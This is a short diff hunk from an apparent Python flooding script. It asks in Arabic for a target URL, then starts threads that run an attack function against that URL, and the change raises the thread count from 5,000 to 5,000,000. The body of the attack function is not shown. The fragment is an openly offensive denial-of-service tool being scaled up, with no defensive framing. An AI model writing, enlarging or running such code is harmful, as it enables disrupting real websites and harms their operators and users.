@@ -21,7 +21,7 @@ def attack(url):
 
 url = input("أدخل رابط الهدف: ")
 
-for i in range(5000):
+for i in range(5000000):
     thread = threading.Thread(target=attack, args=(url,))
     thread.start()
 
